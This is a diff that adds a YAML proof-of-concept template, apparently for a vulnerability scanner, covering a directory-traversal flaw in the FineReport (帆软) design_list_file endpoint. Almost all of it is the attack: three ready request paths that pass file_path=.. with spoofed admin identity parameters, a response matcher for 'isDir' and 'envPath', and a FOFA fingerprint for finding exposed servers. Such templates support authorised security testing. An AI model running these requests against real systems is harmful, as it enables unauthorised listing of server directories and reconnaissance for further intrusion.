@@ -1,0 +1,27 @@
+id: poc-yaml-finereport-design-list-file-directory-traversal
+info:
+  name: 帆软报表 design_list_file 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: finereport
+  fofa: Powered by 帆软
+variables:
+  paths: 'WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true
+
+    seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true
+
+    ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"isDir") &&
+
+    contains(body,"envPath")
+
+    '
+transport: http
